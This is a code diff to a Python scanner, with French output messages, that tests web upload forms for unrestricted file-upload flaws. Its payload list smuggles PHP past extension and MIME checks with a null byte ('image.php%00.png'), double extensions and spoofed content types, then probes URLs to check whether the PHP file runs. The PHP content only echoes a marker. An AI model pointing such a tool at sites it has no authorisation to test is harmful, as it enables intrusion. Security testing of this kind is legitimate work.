@@ -92,7 +92,10 @@ def upload_file(url, field_name, payload, cookies=None, headers=None):
     if isinstance(content, str):
         content = content.encode()
     files = {field_name: (payload["file_name"], content, payload["mime"])}
-    return requests.post(url, files=files, data={"submit": "OK"}, cookies=cookies, headers=headers)
+    req = requests.post(url, files=files, data={"submit": "OK"}, cookies=cookies, headers=headers)
+    if args.details:
+        print(req.text)
+    return req
 
 def analyze_response(html):
     result = {"success": False, "error": None, "path": None}
@@ -102,22 +105,35 @@ def analyze_response(html):
         result["error"] = err.group(0).strip()
         return result
 
-    path = re.search(r'href=[\'"]([^\'"]+/[^\'"]+)[\'"]', html, re.I)
-    if path:
-        result["success"] = True
-        result["path"] = path.group(1)
+    paths = re.findall(r"""href=[\'"]([^\'"]+/[^\'"]+)[\'"]""", html, re.I)
+
+    if not paths:
+        return result
+    if len(paths) > 1:
+        print("[+] Fichier différent toruvés :\n")
+        for i, p in enumerate(paths, 1):
+            print(f"[{i}] {p}")
+        choice = int(input("Choix du fichier upload : "))
+        result["path"] = paths[choice - 1]
+    else:
+        result["path"] = paths[0]
+    result["success"] = True
     return result
 
 def upload_and_analyze(url, field_name, payload, cookies=None, headers=None):
     r = upload_file(url, field_name, payload, cookies, headers)
-    return analyze_response(r.text)
+    u = analyze_response(r.text)
+    if args.details:
+        print(r)
+        print(f"analyze_response : {u}")
+    return u
 
 def find_uploaded_file(target_url, payload, returned_path,
                        cookies=None, headers=None, wordlist=None):
     urls = find_file_urls(target_url, payload['file_name'], returned_path, wordlist)
+    if args.details:
+        print(f'find_file_urls : {urls}')
     for u in urls:
-        if '%00' in u:
-            continue
         try:
             r = requests.get(u, cookies=cookies, headers=headers, timeout=5)
         except requests.RequestException:
@@ -127,15 +143,18 @@ def find_uploaded_file(target_url, payload, returned_path,
             return r.text, u
         elif r.status_code == 403:
             print(f"[!] Permission denied -> {u}")
+        elif r.status_code == 404:
+            print(f"[!] No file found -> {u}")
     return None, None
 
 #===============PAYLOADS===============#
 payloads = {
     0: {"file_name": "sample.txt", "mime": "text/plain", "content": "Ray manta upload"},
-    1: {"file_name": "image.php%00.jpg", "mime": "image/jpeg", "content": b"\xff\xd8\xff\xe0"},
-    2: {"file_name": "image.php", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"},
+    1: {"file_name": "image.php%00.png", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"},
+    2: {"file_name": "image.php", "mime": "image/jpg", "content": "<?php echo 'Ray manta upload'; ?>"},
     3: {"file_name": "image.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
 }
+# \xff\xd8\xff\xe0
 succes = []
 #===============COOKIES + HEADERS===============#
 cookies = None
@@ -204,6 +223,8 @@ if args.url:
                 content, _ = find_uploaded_file(args.url, payload, res["path"], cookies, headers, args.dirb)
                 if content:
                     print(content)
+        else:
+            print(f" File not found : {content}")
 
     print("\n[+] Terminé")
     print(exit_payload)
